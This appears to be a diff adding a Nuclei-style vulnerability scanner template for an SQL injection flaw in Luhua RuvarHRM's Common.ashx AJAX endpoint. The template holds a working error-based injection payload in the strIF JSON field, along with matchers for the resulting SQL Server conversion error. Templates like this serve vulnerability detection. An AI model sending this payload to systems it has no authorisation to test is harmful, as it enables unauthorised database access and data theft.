@@ -1,0 +1,28 @@
+id: luhuaHRM-RuvarHRM_Web_Common_ashx-sql
+
+info:
+  name: 璐华HRM RuvarHRM.Web.Common.ashx SQL注入漏洞
+  author: luhuaHRM
+  severity: high
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        POST /ajaxpro/RuvarHRM.Web.Common.get_account_by_tree,RuvarHRM.Web.Common.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        X-Ajaxpro-Method: SearchUsers
+
+        {"strIF":"1=1) and 1=@@version--","deptPv":"0","strUserType":"all"}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '在将 nvarchar 值'
+          - '转换成数据类型 int 时失败'
+        condition: and
+      - type: status
+        status: 
+          - 200
